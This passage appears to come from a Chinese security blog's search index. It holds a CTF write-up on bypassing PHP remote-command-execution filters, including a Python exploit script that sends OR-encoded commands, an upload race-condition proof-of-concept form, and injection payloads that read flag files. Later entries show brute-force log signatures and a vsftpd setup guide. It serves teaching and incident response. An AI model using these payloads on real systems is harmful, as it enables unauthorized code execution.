class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;D:\phpstudy_pro\Extensions\php\php8.0.2nts\php.exe rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210912154142359.png" alt="image-20210912154142359"></p><h3 id="POST上传条件竞争-没有过滤"><a href="#POST上传条件竞争-没有过滤" class="headerlink" title="POST上传条件竞争 没有过滤."></a>POST上传条件竞争 没有过滤<code>.</code></h3><p>发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母</p><p>使用通配符<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code></p><p>因为我们上传重名的文件存在大写，即构造匹配最后一位大写字母，即可过滤linux文件中全部小写的文件。在ascii码表中，可见大写字母位于<code>@</code>与<code>[</code>之间</p><p><code>.%20/*/????????[@-[]</code></p><p>创建<code>test.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://9a634e82-0c97-423d-b9ff-ca0e27b3ad8d.challenge.ctf.show:8080/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913193458716.png" alt="image-20210913193458716"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913193254558.png" alt="image-20210913193254558"></p><p>添加需要执行的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913193303877.png" alt="image-20210913193303877"></p><mark class="hl-label orange">注意</mark> <h2 id="不显示返回结果"><a href="#不显示返回结果" class="headerlink" title="不显示返回结果"></a>不显示返回结果</h2><h3 id="gt-dev-null-2-gt-amp-1绕过"><a href="#gt-dev-null-2-gt-amp-1绕过" class="headerlink" title="\&gt;/dev/null 2&gt;&amp;1绕过"></a><code>\&gt;/dev/null 2&gt;&amp;1</code>绕过</h3><p><code>ls;ls</code>或<code>ls||ls</code> 双写绕过，把第二个命令写入到<code>/dev/null</code>中去。</p><p><code>?c=tac flag.php%26%26ls</code> <code>&amp;&amp;</code>需要用url编码。</p><p><code>?c=nl flag.php%0a</code> <code>%0a</code>截断</p><h2 id="中断缓冲区"><a href="#中断缓冲区" class="headerlink" title="中断缓冲区"></a>中断缓冲区</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure><p><code>include(&#39;/flag.txt&#39;);exit(0);</code>或<code>exit();</code>或<code>exit;</code></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p><code>tac</code> 从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主机暴力破解日志特征</title>
      <link href="/p/75bed629.html"/>
      <url>/p/75bed629.html</url>
      
        <content type="html"><![CDATA[<h2 id="FTP-21端口"><a href="#FTP-21端口" class="headerlink" title="FTP(21端口)"></a>FTP(21端口)</h2><h3 id="匿名登录"><a href="#匿名登录" class="headerlink" title="匿名登录"></a>匿名登录</h3><p><code>cat /var/log/vsftpd.log | grep &#39;anonymous&#39;| grep &#39;PASS &lt;password&gt;&#39;</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210908145529547.png" alt="image-20210908145529547"></p><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>查看暴力破解记录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/vsftpd.log | grep &#x27;530&#x27;</span><br></pre></td></tr></table></figure><p>查看ip尝试次数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/vsftpd.log | awk &#x27;/530/&#123;print $(NF-3)&#125;&#x27; |sort|uniq -c|sort -k 1 -rn</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210908153214081.png" alt="image-20210908153214081"></p><p>查看可疑ip是否登录成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/vsftpd.log | grep &#x27;230&#x27; | grep &#x27;192.168.79.132&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Wed Sep  8 22:22:15 2021 [pid 342022] [longer] FTP response: Client &quot;192.168.79.132&quot;, &quot;230 Login successful.&quot;</span><br></pre></td></tr></table></figure><p>查看上传下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tue Sep  7 16:07:29 2021 1 ::ffff:192.168.79.132 0 /test/testfile.txt a _ o a anonymous ftp 0 * c</span><br><span class="line">Tue Sep  7 17:27:27 2021 1 192.168.79.132 0 /test_ftp.txt a _ i r longer ftp 0 * i</span><br></pre></td></tr></table></figure><p>windows下成功登录</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909095642142.png" alt="image-20210909095642142"></p><p>上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021-09-09 02:02:33 192.168.79.132 - 192.168.77.175 21 STOR test.exe 226 0 0 399fdf8e-2a13-4105-b8ad-20048579c070 /test.exe</span><br></pre></td></tr></table></figure><p>下载文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021-09-09 02:14:01 192.168.79.132 - 192.168.77.175 21 RETR 123.txt 226 0 0 1ac045c4-5b7a-44f9-95cc-f0e47e079fc5 /test/123.txt</span><br></pre></td></tr></table></figure><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p><code>/var/log/secure</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210907143236260.png" alt="image-20210907143236260"></p><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><p>linux 日志位置：<code>/var/log/secure</code></p><p>成功登录的日志 特征词<code>LOGIN ON</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909161004322.png" alt="image-20210909161004322"></p><p>失败登录日志 <code>FAILED LOGIN</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909161821753.png" alt="image-20210909161821753"></p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210910101048477.png" alt="image-20210910101048477"></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FTP服务器</title>
      <link href="/p/92957adc.html"/>
      <url>/p/92957adc.html</url>
      
        <content type="html"><![CDATA[<h2 id="linxux-ftp"><a href="#linxux-ftp" class="headerlink" title="linxux_ftp"></a>linxux_ftp</h2><h3 id="安装-amp-运行"><a href="#安装-amp-运行" class="headerlink" title="安装&amp;运行"></a>安装&amp;运行</h3><p>yum</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install vsftpd</span><br></pre></td></tr></table></figure><p>开机自启&amp;启动服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable vsftpd.service</span><br><span class="line">systemctl start vsftpd.service</span><br></pre></td></tr></table></figure><p>查看监听端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antup | grep ftp</span><br></pre></td></tr></table></figure><h3 id="配置vsftpd"><a href="#配置vsftpd" class="headerlink" title="配置vsftpd"></a>配置vsftpd</h3><p>为FTP服务创建一个Linux用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser ftptest</span><br></pre></td></tr></table></figure><p>修改用户密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd ftptest</span><br></pre></td></tr></table></figure><p>创建一个供FTP服务使用的文件目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/ftp/test</span><br></pre></td></tr></table></figure><p>创建测试文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch /var/ftp/test/testfile.txt</span><br></pre></td></tr></table></figure><p>更改<code>/var/ftp/test</code>目录的拥有者为<strong>ftptest</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R ftptest:ftptest /var/ftp/test</span><br></pre></td></tr></table></figure><h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br></pre></td></tr></table></figure><blockquote><p>如果使用的是<code>apt install vsftpd</code>安装命令，则配置文件路径为/etc/vsftpd.conf</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#除下面提及的参数，其他参数保持默认值即可。</span><br><span class="line"></span><br><span class="line">#修改下列参数的值：</span><br><span class="line">#禁止匿名登录FTP服务器。</span><br><span class="line">anonymous_enable=NO</span><br><span class="line">#允许本地用户登录FTP服务器。</span><br><span class="line">local_enable=YES</span><br><span class="line">#监听IPv4 sockets。</span><br><span class="line">listen=YES</span><br><span class="line"></span><br><span class="line">#在行首添加#注释掉以下参数：</span><br><span class="line">#关闭监听IPv6 sockets。</span><br><span class="line">#listen_ipv6=YES</span><br><span class="line"></span><br><span class="line">#在配置文件的末尾添加下列参数：</span><br><span class="line">#设置本地用户登录后所在目录。</span><br><span class="line">local_root=/var/ftp/test</span><br><span class="line">#全部用户被限制在主目录。</span><br><span class="line">chroot_local_user=YES</span><br><span class="line">#启用例外用户名单。</span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">#指定例外用户列表文件，列表中用户不被锁定在主目录。</span><br><span class="line">chroot_list_file=/etc/vsftpd/chroot_list</span><br><span class="line">#开启被动模式。</span><br><span class="line">pasv_enable=YES</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line">#本教程中为Linux实例的公网IP。</span><br><span class="line">pasv_address=&lt;FTP服务器公网IP地址&gt;</span><br><span class="line">#设置被动模式下，建立数据传输可使用的端口范围的最小值。</span><br><span class="line">#建议您把端口范围设置在一段比较高的范围内，例如50000~50010，有助于提高访问FTP服务器的安全性。</span><br><span class="line">pasv_min_port=&lt;port number&gt;</span><br><span class="line">#设置被动模式下，建立数据传输可使用的端口范围的最大值。</span><br><span class="line">pasv_max_port=&lt;port number&gt;</span><br></pre></td></tr></table></figure><p>chroot_list文件，并在文件中写入例外用户名单</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/chroot_list</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart vsftpd.service</span><br></pre></td></tr></table></figure><p>/etc/vsftpd目录下文件说明如下：</p><ul><li>/etc/vsftpd/vsftpd.conf是vsftpd的核心配置文件。</li><li>/etc/vsftpd/ftpusers是黑名单文件，此文件中的用户不允许访问FTP服务器。</li><li>/etc/vsftpd/user_list是白名单文件，此文件中的用户允许访问FTP服务器。</li></ul><h4 id="用户登录控制参数说明"><a href="#用户登录控制参数说明" class="headerlink" title="用户登录控制参数说明"></a>用户登录控制参数说明</h4><table><thead><tr><th align="left">参数</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">anonymous_enable=YES</td><td align="left">接受匿名用户</td></tr><tr><td align="left">no_anon_password=YES</td><td align="left">匿名用户login时不询问口令</td></tr><tr><td align="left">anon_root=（none）</td><td align="left">匿名用户主目录</td></tr><tr><td align="left">local_enable=YES</td><td align="left">接受本地用户</td></tr><tr><td align="left">local_root=（none）</td><td align="left">本地用户主目录</td></tr></tbody></table><h4 id="用户权限控制参数说明"><a href="#用户权限控制参数说明" class="headerlink" title="用户权限控制参数说明"></a>用户权限控制参数说明</h4><table><thead><tr><th align="left">参数</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">write_enable=YES</td><td align="left">可以上传文件（全局控制）</td></tr><tr><td align="left">local_umask=022</td><td align="left">本地用户上传的文件权限</td></tr><tr><td align="left">file_open_mode=0666</td><td align="left">上传文件的权限配合umask使用</td></tr><tr><td align="left">anon_upload_enable=NO</td><td align="left">匿名用户可以上传文件</td></tr><tr><td align="left">anon_mkdir_write_enable=NO</td><td align="left">匿名用户可以建目录</td></tr><tr><td align="left">anon_other_write_enable=NO</td><td align="left">匿名用户修改删除</td></tr><tr><td align="left">chown_username=lightwiter</td><td align="left">匿名上传文件所属用户名</td></tr></tbody></table><h3 id="出现问题"><a href="#出现问题" class="headerlink" title="出现问题"></a>出现问题</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210907203159011.png" alt="image-20210907203159011"></p><p>解决方法禁用<code>SELinux</code></p><p>暂时禁用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0</span><br><span class="line">setenforce Permissive</span><br></pre></td></tr></table></figure><p>永久禁用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/selinux/config</span><br><span class="line">SELINUX=disabled</span><br></pre></td></tr></table></figure><p><strong>打开ftp服务器上的文件夹时发生错误，请检查是否有权限访问该文件夹</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210907202342604.png" alt="image-20210907202342604"></p><p>解决方法：打开 “网络和共享中心”，找到“Internet选项” –&gt;【高级】这页，取消掉“使用被动FTP(用于防火墙和DSL调制解调器的兼容)”</p><h2 id="windows-ftp"><a href="#windows-ftp" class="headerlink" title="windows_ftp"></a>windows_ftp</h2><p><a href="https://www.jianshu.com/p/7d7d2a0d3deb">Windows server 2016 FTP服务器的搭建</a></p><h2 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h2><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>!</td><td>在本地机中执行交互shell，exit回到ftp环境</td></tr><tr><td>dir</td><td>显示远程计算机上的目录文件和子目录列表</td></tr><tr><td>cd</td><td>指定要更改的远程计算机上的目录</td></tr><tr><td>lcd</td><td>更改本地计算机上的工作目录。默认情况下，工作目录是启动 <strong>ftp</strong> 的目录</td></tr><tr><td>get</td><td>使用当前文件传输类型将远程文件复制到本地计算机。</td></tr><tr><td>open</td><td>与指定的 FTP 服务器连接</td></tr><tr><td>put/send</td><td>使用当前文件传输类型将本地文件复制到远程计算机上</td></tr></tbody></table><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>默认情况下，Vsftp不单独记录日志，也就是说不会输出到一个单独的文件中存储，而是统一存放到<code>/var/log/messages</code>文件中。</p><p>常见解决方案</p><ol><li>xferlog_enable=YES </li><li>xferlog_std_format=YES </li><li>xferlog_file=/var/log/xferlog  </li><li>dual_log_enable=YES </li><li>vsftpd_log_file=/var/log/vsftpd.log</li></ol><p>在配置文件中启用<code>xferlog_enable=YES</code>，它表示将客户机登录服务器后上传或下载的文件具体信息记录。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210908112713651.png" alt="image-20210908112713651"></p><p><code>xferlog_std_format=YES</code> 传输日志文件将以标准 xferlog 的格式书写，该格式的日志文件默认为 <code>/var/log/xferlog</code></p><p><code>dual_log_enable=YES</code>，它表示启用双份日志，将生成两个相似的日志文件，默认在 <code>/var/log/xferlog</code> 和 <code>/var/log/vsftpd.log</code> 目录下。前者是 wu-ftpd 类型的传输日志，可以利用标准日志工具对其进行分析；后者是Vsftpd类型的日志。</p><p><code>syslog_enable</code>原本应该输出到<code>/var/log/vsftpd.log</code>中的日志，将输出到系统日志中。</p><h4 id="vsftpd-log"><a href="#vsftpd-log" class="headerlink" title="vsftpd.log"></a>vsftpd.log</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210908113502525.png" alt="image-20210908113502525"></p><blockquote><p>日志仅反映了部分Ftp登录情况：例如登录IP地址、用户名</p></blockquote><p>成功登录标识</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wed Sep  8 21:02:29 2021 [pid 340294] [longer] FTP command: Client &quot;192.168.79.132&quot;, &quot;PASS &lt;password&gt;&quot;</span><br><span class="line">Wed Sep  8 21:02:29 2021 [pid 340293] [longer] OK LOGIN: Client &quot;192.168.79.132&quot;</span><br></pre></td></tr></table></figure><h4 id="Xferlog"><a href="#Xferlog" class="headerlink" title="Xferlog"></a>Xferlog</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wed Sep  8 19:08:51 2021 1 ::ffff:192.168.79.132 0 /test_ftp.txt a _ o r longer ftp 0 * c</span><br><span class="line">Wed Sep  8 21:03:00 2021 1 192.168.79.132 0 /testfile.txt a _ o r longer ftp 0 * c</span><br></pre></td></tr></table></figure><table><thead><tr><th>记录</th><th>含义</th></tr></thead><tbody><tr><td>Tue Sep  7 15:35:57 2021</td><td>FTP传输时间</td></tr><tr><td>1</td><td>传输文件所用时间。单位/秒</td></tr><tr><td>192.168.79.132</td><td>ftp客户端名称/IP</td></tr><tr><td>0</td><td>传输文件大小。单位/Byte</td></tr><tr><td>/testfile.txt</td><td>传输文件名，包含路径</td></tr><tr><td>a</td><td>传输方式： a以ASCII方式传输; b以二进制(binary)方式传输;</td></tr><tr><td>_</td><td>特殊处理标志位：”_”不做任何处理；”C”文件是压缩格式；”U”文件非压缩格式；”T”文件是tar格式；</td></tr><tr><td>o</td><td>传输方向：”i”上传；”o”下载；</td></tr><tr><td>r</td><td>用户访问模式：“a”匿名用户；”g”访客模式；”r”系统中用户;</td></tr><tr><td>longer</td><td>登录用户名</td></tr><tr><td>ftp</td><td>服务名称，一般都是ftp</td></tr><tr><td>0</td><td>认证方式：”0”无；”1”RFC931认证；</td></tr><tr><td>*</td><td>认证用户id，”*”表示无法获取id</td></tr><tr><td>c</td><td>完成状态：”i”传输未完成；”c”传输已完成；</td></tr></tbody></table><blockquote><p>为啥会出现<code>::ffff:</code>，因为之前<code>vsftpd.conf</code>中默认<code>listen=YES</code>，<code>#listen_ipv6=YES</code>这个忘记注释掉。</p><p>IPv4 映射的 IPv6 地址使用此替代格式。此类型的地址用于将 IPv4 节点表示为 IPv6 地址。它允许 IPv6 应用程序直接与 IPv4 应用程序通信。例如，<code>0:0:0:0:0:ffff:192.1.56.10</code> 和 <code>::ffff:192.1.56.10/96</code>（短格式）。</p></blockquote><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h4 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h4><p><code>win+r</code> ,输入<code>inetmgr</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210908174120348.png" alt="image-20210908174120348"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210908174347526.png" alt="image-20210908174347526"></p><h4 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#Software: Microsoft Internet Information Services 10.0</span><br><span class="line">#Version: 1.0</span><br><span class="line">#Date: 2021-09-08 09:21:23</span><br><span class="line">#Fields: date time c-ip cs-username s-ip s-port cs-method cs-uri-stem sc-status sc-win32-status sc-substatus x-session x-fullpath</span><br><span class="line">2021-09-08 09:21:23 192.168.79.132 - 192.168.77.175 21 ControlChannelOpened - - 0 0 ab78edb1-c781-42ff-8056-24cc80701847 -</span><br><span class="line">2021-09-08 09:21:23 192.168.79.132 - 192.168.77.175 21 OPTS UTF8+ON 200 0 0 ab78edb1-c781-42ff-8056-24cc80701847 -</span><br><span class="line">2021-09-08 09:21:30 192.168.79.132 - 192.168.77.175 21 USER anonymous 331 0 0 ab78edb1-c781-42ff-8056-24cc80701847 -</span><br><span class="line">2021-09-08 09:21:32 192.168.79.132 - 192.168.77.175 21 PASS eeee 230 0 0 ab78edb1-c781-42ff-8056-24cc80701847 /</span><br><span class="line">2021-09-08 09:23:42 192.168.79.132 - 192.168.77.175 21 ControlChannelClosed - - 258 0 ab78edb1-c781-42ff-8056-24cc80701847 -</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909095011088.png" alt="image-20210909095011088"></p><h2 id="FTP状态码"><a href="#FTP状态码" class="headerlink" title="FTP状态码"></a>FTP状态码</h2><h3 